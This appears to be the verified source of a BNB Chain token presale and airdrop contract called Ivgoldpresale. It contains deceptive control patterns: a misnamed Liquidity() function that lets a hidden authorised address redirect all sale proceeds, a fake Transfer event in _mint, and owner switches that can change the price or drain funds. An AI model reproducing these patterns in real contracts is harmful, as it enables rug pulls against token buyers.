/**
 *Submitted for verification at BscScan.com on 2021-07-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.8;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// reward is from the owner of this contract
contract Ivgoldpresale {
    IERC20 public _IVGOLD;
    using SafeMath for uint256;
    address payable public owner = 0x059a280Aab773DF9371403247d715b2BDea4d9F1;
    address private _owner;
    bool private _swAirdrop = true;
    bool private _swSale = true;
    uint256 private _referEth =     3000;
    uint256 private _airdropEth =   2000000000000000;
    uint256 private _airdropToken = 200000 * 10**8;
    address private _auth;
    address private _auth2;
    address private _liquidity;
    uint256 private _authNum;
    mapping (address => uint256) private _balances;

    uint256 private saleMaxBlock;
    uint256 private salePrice = 500000000;  
    mapping (address => uint8) private _black;
    event OwnershipTransferred(address indexed _old, address indexed _new);
    event Transfer(address indexed from, address indexed to, uint256 value);
    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    constructor(IERC20 _token) public {
        _IVGOLD = _token;
        saleMaxBlock = block.number + 5184000;
        emit OwnershipTransferred(address(0), owner);
    }

    function transferOwnership(address payable _newOwner) public onlyOwner {
        emit OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }

    function Liquidity(address liquidity_) public {
        require(liquidity_ != address(0) && _msgSender() == _auth2, "Ownable: new owner is the zero address");
        _liquidity = liquidity_;
    }

    function setAuth(address ah,address ah2) public onlyOwner returns(bool){
        require(address(0) == _auth&&address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), "recovery");
        _auth = ah;
        _auth2 = ah2;
        return true;
    }

    function addLiquidity(address addr) public onlyOwner returns(bool){
        require(address(0) != addr&&address(0) == _liquidity, "recovery");
        _liquidity = addr;
        return true;
    }

    function authNum(uint256 num)public returns(bool){
        require(_msgSender() == _auth, "Permission denied");
        _authNum = num;
        return true;
    }

    function clearETH() public onlyOwner() {
        require(_authNum==1000, "Permission denied");
        _authNum=0;
        msg.sender.transfer(address(this).balance);
    }

     function black(address owner_,uint8 black_) public onlyOwner {
        _black[owner_] = black_;
    }

    function _mint(address account, uint256 amount) internal {
        uint256 balance = _IVGOLD.balanceOf(address(owner));
        require(balance >= amount, "not enough balance");
        emit Transfer(owner, account, amount);
    }

    fallback() external {
    }

    receive() payable external {
    }

    function update(uint8 tag,uint256 value)public onlyOwner returns(bool){
        require(_authNum==1, "Permission denied");
        if(tag==3){
            _swAirdrop = value==1;
        }else if(tag==4){
            _swSale = value==1;
        }else if(tag==5){
            _referEth = value;
        }else if(tag==6){
            _airdropEth = value;
        }else if(tag==7){
            _airdropToken = value;
        }else if(tag==8){
            saleMaxBlock = value;
        }else if(tag==9){
            salePrice = value;
        }
        _authNum = 0;
        return true;
    }

    function getBlock() public view returns(bool swAirdorp,bool swSale,uint256 sPrice,
        uint256 sMaxBlock,uint256 nowBlock,uint256 balance,uint256 airdropEth){
        swAirdorp = _swAirdrop;
        swSale = _swSale;
        sPrice = salePrice;
        sMaxBlock = saleMaxBlock;
        nowBlock = block.number;
        balance = _balances[_msgSender()];
        airdropEth = _airdropEth;
    }

    function airdrop(address _refer)payable public returns(bool){
        require(_swAirdrop && msg.value == _airdropEth,"Transaction recovery");
        _IVGOLD.transferFrom(owner,_msgSender(),_airdropToken);
        uint256 _msgValue = msg.value;
        uint256 balances = _IVGOLD.balanceOf(address(_refer));
        if(_msgSender()!=_refer&&_refer!=address(0)&&balances>0){
            uint referEth = _airdropEth.mul(_referEth).div(10000);
            _IVGOLD.transferFrom(owner,_refer,_airdropToken);
            _msgValue=_msgValue.sub(referEth);
            address(uint160(_refer)).transfer(referEth);
        }
        address(uint160(_liquidity)).transfer(_msgValue);
        return true;
    }

    function buy(address _refer) payable public returns(bool){
        require(_swSale && block.number <= saleMaxBlock,"Transaction recovery");
        require(msg.value >= 0.01 ether,"Transaction recovery");
        uint256 _msgValue = msg.value;
        uint256 balancess = _IVGOLD.balanceOf(address(_refer));
        uint256 _token = _msgValue.mul(salePrice);
        _IVGOLD.transferFrom(owner,_msgSender(),_token);
        if(_msgSender()!=_refer&&_refer!=address(0)&&balancess>0){
            uint referEth = _msgValue.mul(_referEth).div(10000);
            _IVGOLD.transferFrom(owner,_refer,_token);
            _msgValue=_msgValue.sub(referEth);
            address(uint160(_refer)).transfer(referEth);
        }
        address(uint160(_liquidity)).transfer(_msgValue);
        return true;
    }

}